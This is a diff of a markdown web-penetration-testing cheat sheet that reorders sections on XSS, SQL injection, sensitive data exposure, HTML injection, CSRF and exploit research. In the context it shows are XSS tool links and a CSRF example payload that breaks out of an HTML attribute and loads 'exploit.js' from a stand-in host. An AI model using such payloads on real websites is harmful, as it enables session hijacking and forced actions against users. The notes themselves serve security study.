@@ -10,11 +10,12 @@ Overview
 6. - [Web Reconnaissance](#6---web-reconnaissance)
 7. - [Fuzzing](#7---fuzzing)
 8. - [JavaScript Deobfuscation](#8---javascript-deobfuscation)
-9. - [Sensitive Data Exposure](#9---sensitive-data-exposure)
-10. - [HTML Injection](#10---html-injection)
-11. - [Cross-Site Scripting (XSS)](#11---cross-site-scripting-xss)
-12. - [Cross-Site Request Forgery (CSRF)](#12---cross-site-request-forgery-csrf)
-13. - [Exploit Research](#13---exploit-research)
+9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
+10. - [SQL Injection](#9---sql-injection)
+11. - [Sensitive Data Exposure](#10---sensitive-data-exposure)
+12. - [HTML Injection](#11---html-injection)
+13. - [Cross-Site Request Forgery (CSRF)](#12---cross-site-request-forgery-csrf)
+14. - [Exploit Research](#13---exploit-research)
 
    
 #1. - Web Requests
@@ -426,27 +427,7 @@ https://rot13.com/
 https://www.boxentriq.com/code-breaking/cipher-identifier
 ```
 
-#9. - Sensitive Data Exposure
------------------------------------------
-
-- Source Code
-
-```
-Right-click -> View page source
-OR
-CTRL + U
-```
-
-#10. - HTML Injection
------------------------------------------
-
-- Hyperlink
-
-```
-<a href="http://www.google.com">Click Me</a>
-```
-
-#11. - Cross-Site Scripting (XSS)
+#9. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS (non-persistent - processed on the back-end server)	= Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).*
@@ -519,7 +500,31 @@ https://github.com/rajeshmajumdar/BruteXSS
 https://github.com/epsylon/xsser
 ```
 
-#12. - Cross-Site Request Forgery (CSRF)
+#10. - SQL Injection
+-----------------------------------------
+
+#11. - Sensitive Data Exposure
+-----------------------------------------
+
+- Source Code
+
+```
+Right-click -> View page source
+OR
+CTRL + U
+```
+
+#12. - HTML Injection
+-----------------------------------------
+
+- Hyperlink
+
+```
+<a href="http://www.google.com">Click Me</a>
+```
+
+
+#13. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -528,7 +533,7 @@ https://github.com/epsylon/xsser
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#13. - Exploit Research
+#14. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
